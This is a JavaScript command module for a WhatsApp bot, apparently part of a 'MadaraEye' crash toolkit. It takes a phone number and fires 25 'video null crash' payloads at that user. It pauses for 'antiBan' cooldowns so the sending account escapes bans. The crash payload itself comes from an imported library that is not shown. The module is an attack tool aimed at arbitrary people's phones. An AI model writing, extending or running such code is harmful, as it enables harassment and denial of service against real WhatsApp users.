'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');
const { canCrash, recordCrash } = require('../../lib/antiBan');

module.exports = {
    name: 'vidx',
    aliases: ['vidxnull', 'videonull', 'vidcrash'],
    category: 'madaraeye',
    desc: 'ᴠɪᴅᴇᴏ ɴᴜʟʟ ᴄʀᴀsʜ ᴠ2',
    usage: '.vidx <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
        if (!args[0]) return sock.sendMessage(ctx.from, { text: `❌ *Usage:* ${prefix}vidx <number>` }, { quoted: msg });
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        let eye = global.getMadaraEye?.(sock) || new MadaraEye(sock);
        const TOTAL = 25;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                let allowed = false;
                while (!allowed) {
                    try { await canCrash(phone); allowed = true; }
                    catch (e) {
                        const waitMatch = e.message.match(/(\d+)s/);
                        const waitSec = waitMatch ? parseInt(waitMatch[1]) : 30;
                        await bar.setPhase(`⏳ ${e.message}`);
                        const chunks = Math.ceil(waitSec / 5);
                        for (let c = 0; c < chunks; c++) {
                            await new Promise(r => setTimeout(r, 5000));
                            await bar.setPhase(`⏳ ᴄᴏᴏʟᴅᴏᴡɴ: ${Math.max(0, waitSec - (c + 1) * 5)}s`);
                        }
                    }
                }
                await eye.vidxNull(target);
                await recordCrash(phone);
                await bar.update(1, 'ᴠɪᴅx ɴᴜʟʟ');
            }
            await bar.done(`✅ ᴠɪᴅx ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs\n🎯 ${target}`);
        } catch (e) { await bar.done(`❌ ${e.message}`); }
    }
};